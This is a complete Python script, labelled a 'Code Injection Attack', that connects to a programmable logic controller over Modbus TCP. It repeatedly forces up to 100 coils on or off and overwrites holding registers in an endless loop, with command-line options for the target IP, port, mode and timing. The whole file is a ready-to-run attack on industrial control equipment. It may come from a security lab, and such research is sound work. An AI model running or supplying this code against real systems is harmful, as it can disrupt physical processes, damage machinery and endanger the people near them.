import time
from pymodbus.client import ModbusTcpClient
from colorama import Fore, Style
import argparse

parser = argparse.ArgumentParser(description="Code Injection Attack", 
                                 usage="python3 code_injection.py --ip <IP> --port <PORT> --mode <MODE> --n_coils <N_COILS> --n_holding_registers <N_HOLDING_REGISTERS> --hr_value <HR_VALUE> --time <TIME>")
parser.add_argument("--ip", help="IP address of the PLC", type=str, required=True)
parser.add_argument("--port", help="Port number of the PLC", type=int, required=True)
parser.add_argument(
    "--mode",
    choices=["up", "down"],  # Restrict input to these values
    help="Mode of the attack:\n- up : Enable all states of the PLC\n- down : Disable all states of the PLC",
    required=False,
    default="up"
)
parser.add_argument("--n_coils", help="Number of coils to be manipulated", type=int, required=False, default=100)
parser.add_argument("--n_holding_registers", help="Number of holding registers to be manipulated", type=int, required=False, default=100)
parser.add_argument("--hr_value", help="Value to be written to the holding registers", type=int, required=False, default=0)
parser.add_argument("--time", help="Time to wait between each two successive attacks", type=int, required=False, default=0)
args = parser.parse_args()

try: 
    client = ModbusTcpClient(host=args.ip, port=args.port)
    connection_status = client.connect()
    print(Fore.GREEN + "Connection successfully established" + Style.RESET_ALL)

except:
    print(Fore.RED+"The IP address or the port is incorrect. Please check the configurations."+Style.RESET_ALL)

status_flags = {
    "up": True,
    "down": False
}

while True:
    try:
        if args.mode == "up" or args.mode == "down":
            for i in range(args.n_coils):
                client.write_coil(i, status_flags[args.mode])
            for j in range(args.n_holding_registers):
                client.write_register(j, args.hr_value)
        time.sleep(args.time)
        
    except KeyboardInterrupt:
        print(Fore.YELLOW + "The attack has been stopped" + Style.RESET_ALL)
        break
    except Exception as e:
        print(Fore.RED + f"An error occurred: {e}" + Style.RESET_ALL)